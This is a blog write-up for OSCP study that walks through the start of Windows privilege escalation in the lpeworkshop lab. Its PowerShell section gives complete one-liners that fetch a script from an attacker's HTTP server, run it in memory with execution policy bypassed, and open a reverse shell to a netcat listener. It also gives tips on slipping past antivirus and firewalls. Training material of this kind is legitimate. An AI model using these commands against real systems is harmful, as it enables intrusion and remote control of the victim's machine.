As stated in the [OSCP Review Post](/oscp/OSCP-Review), I came across many good resources for Linux Privilege Escalation but there were just a few for Windows. [lpeworkshop](https://github.com/sagishahar/lpeworkshop) being one of those, lacks a good walkthrough. In this writeup, we will take a look at file transfer over smb and http, how to migrate to PowerShell from a standard cmd shell and lpeworkshop setup.

## File transfer over SMB

While there are numerous methods to transfer files from your host Kali to victim Windows, I found SMB to be the most reliable one. 
- Install impacket on your kali (It comes preinstalled most of the times, located at /usr/share/impacket/examples/).
- Start the SMB server by running `smbserver.py`:  
![image-center](/assets/images/oscp/1/smbshare.png)
This will share the `/tmp/smbshare` directory over smb as `myshare`.
- All the files inside `/tmp/smbshare` can now directly be accessed on the victim windows:  
![image-center](/assets/images/oscp/1/smbshare1.png)
- For more convenience, this SMB share can be  mounted directly on the windows as a drive:
	- Check currently mounted shares by running `net use`:
	- Mount your `myshare` as drive `Z` (or any other letter) using the command
	`net use Z: \\<IP>\myshare`
		![image-center](/assets/images/oscp/1/smbmount.png)
- Now, you can simply change dir to `Z` and browse the shared files as a drive on the victim system.

- The mount can be disconnected with command `net use Z: /d` and deleted with `net use Z: /delete` once you are done with it.

Another easy way to transfer files is over http using python's SimpleHTTPServer or Apache. We will take a look at it and download files using PowerShell in the following section.

## PowerShell

PowerShell provides an easy way to perform post exploitation and privilege escalation activities with the help of various PS modules. Two of the most useful modules that I came across were: [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [Powersploit's PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

While most of the newer Windows OS have a functional antivirus monitoring and prohibiting the execution of programs from storage, PowerShell provides us with an option to bypass this and run programs directly from the memory. This can help us evade the antivirus and easily run exploits or post-exploitation scripts.
1. Share your files using python's `SimpleHTTPServer` or Apache.   
![image-center](/assets/images/oscp/1/http1.png)
2. On the victim's cmd shell, execute the command:
`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/testfile'))"`
This downloads `testfile` and executes it in the memory.

### Upgrading to PowerShell from cmd using Nishang

The `Invoke-PowerShellTcp.ps1` can be used to get an interactive Reverse or Bind PowerShell from the target. This script is able to connect to an attacker's netcat listener using -Reverse switch or an attacker's netcat can connect to this script Bind to a specific port on the victim when using -Bind switch. For this exercise, we are assuming that you already have access to the victim (web command injection or a cmd shell using eternalblue/any other exploit) and will look at how this cmd shell can be upgraded to an interactive reverse PowerShell.

### Method 1: Using HTTP (Can evade Windows AV)

We will share our `Invoke-PowerShellTcp.ps1` over http, download it to the victim, and execute it inside memory to send a reverse PowerShell.
1. Start python's `SimpleHTTPServer` and copy the `Invoke-PowerShellTcp.ps1` to that directory.   
![image-center](/assets/images/oscp/1/httpps1.png)
2. Start netcat listener on your Kali (always prefer using standard ports such as 80,443,53 since they have less chances of being blacklisted on the victim's firewall).
3. On the victim, we can download and execute this script using command: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`   
![image-center](/assets/images/oscp/1/httpps2.png)
4. This sends an interactive reverse PowerShell to our kali on port 443:  
![image-center](/assets/images/oscp/1/httpps3.png) 
5. This script can also be used to setup a bind shell on the victim using `-Bind` switch but I preferred using reverse shells in the PWK lab.

### Method 2: Using SMB (Gets blocked by Windows AV)

While this method is convenient for sharing multiple files over smb, but since we are executing `Invoke-PowerShellTcp.ps1` from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver. 
2. Start netcat listener on Kali.
3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
`powershell.exe -nop -ep bypass -c "Import-Module .\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`
![image-center](/assets/images/oscp/1/ps2.png)
(Note: I disabled windows AV for this exercise)
4. This sends a fully interactive PowerShell to our kali on port 443:

### Command breakdown

Let's see the breakdown:   
`powershell.exe -nop -ep bypass -c "<Command>"` : We are executing powershell using three arguments:
1. `-nop` or `NoProfile` : This option means that the currently active userâ€™s profile will not be loaded.
2. `-ep bypass` or `-ExecutionPolicy Bypass` : Execution Policy restricts script execution on most systems on the default setting This can be overcome by giving Bypass value to the value of -ExecutionPolicy parameter. 
3. `-c` or `-Command` : This is used to specify a command to be executed.
	- `"iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))` : This part of the command downloads the `Invoke-PowerShellTcp.ps1` file.
	- `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"` : These are the arguments passed to `Invoke-PowerShellTcp.ps1` module. More arguments or examples can be seen on Nishang's github.
	- Pro tip: you can append the `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <port>` to your `Invoke-PowerShellTcp.ps1`. This way, your final command for reverse shell would just be downloading and invoking the module, you don't have to pass the arguments anymore:
	`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`

## lpeworkshop
For the setup, we need three things:
1. Windows 7/10
We can grab a free copy of Windows Evaluation versions directly from [Microsoft](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) or from [magnetikonline's github repo](https://github.com/magnetikonline/linux-microsoft-ie-virtual-machines). Prefer getting a Windows 7 as this workshop was developed and tested on a Windows 7 (SP1) x64 host. 
2. [Windows Exercises Setup Script](https://github.com/sagishahar/lpeworkshop/blob/master/lpe_windows_setup.bat)
3. [Tools for Windows Exercises](https://drive.google.com/file/d/1Lgg3HXXltB7ZD3F5YSbRl6FX7h_mPzFU/view?usp=sharing) (7z archive password: lpeworkshop)  
{: .text-justify}

[Note: Take a snapshot of the windows VM before starting the setup]  
The setup is fairly simple: Copy the lpe_windows_setup.bat script to VM and run it as an Administrator. A few exercises will not be setup (1,9,14) as those are platform specific and are not included in the setup script.
{: .text-justify}

In the next part, we will go through the exercises from lpeworkshop and see how we can indentify and exploit the vulnerabilties with the help of `PowerUp.ps1`
